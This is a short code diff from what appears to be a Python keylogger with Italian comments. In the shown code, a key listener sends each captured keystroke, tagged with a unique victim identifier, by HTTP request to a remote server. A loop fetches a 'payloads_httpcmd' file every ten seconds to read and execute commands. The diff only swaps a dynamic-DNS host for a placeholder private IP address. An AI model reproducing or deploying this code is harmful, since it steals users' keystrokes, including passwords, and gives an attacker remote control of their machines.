@@ -19,7 +19,7 @@ def send_request(key):
     try:
         # Converti il tasto premuto in stringa
         key_str = str(key).replace("'", "")
-        url = f'http://elektroklog.sytes.net/{codice_univoco}/{key_str}'
+        url = f'http://192.168.x.x{codice_univoco}/{key_str}'
         response = requests.get(url)
         print(f'Richiesta inviata a {url} stato: {response.status_code}')
     except Exception as e:
@@ -55,5 +55,5 @@ listener.start()
 
 # loop 
 while True:
-    controlla_leggi_esegui_script("http://elektroklog.sytes.net/payloads_httpcmd/default.txt")
+    controlla_leggi_esegui_script("http://192.168.x.x/payloads_httpcmd/default.txt")
     time.sleep(10)
